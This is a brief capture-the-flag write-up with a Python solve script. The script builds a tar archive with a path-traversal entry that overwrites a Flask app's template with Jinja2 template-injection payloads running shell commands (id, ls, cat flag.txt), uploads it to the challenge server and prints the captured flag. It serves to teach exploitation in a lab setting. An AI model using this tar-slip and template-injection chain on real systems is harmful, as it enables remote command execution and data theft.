# stumped
 use the tar arb write to overwrite the template tree.html with flask template injection code. however need to be careful, must not visit / before overwriting or it won't work. probably because flask caches the html once you load it? not sure.
 
```
import requests
import tarfile

with open('test.txt', 'w') as f:
    f.write("""{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
            {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}""")
with tarfile.open('my_archive.tar', 'w:xz') as tar:
    # tar.add('test.txt', arcname='../templates/tree.html')
    tar.add('test.txt', arcname='../../../../../../../../../../../../../../../../opt/app/templates/tree.html')

url = 'https://thecybercoopctf-4e58b65f13e3-stumped-1.chals.io'
file_path = './my_archive.tar'

files = {'file': open(file_path, 'rb')}
response = requests.post(f"{url}/show_tree", files=files)

print(response.text)

print(requests.get(url).text)
```
# flag{n0t_5tump3d_4nym0r3!}
# nice

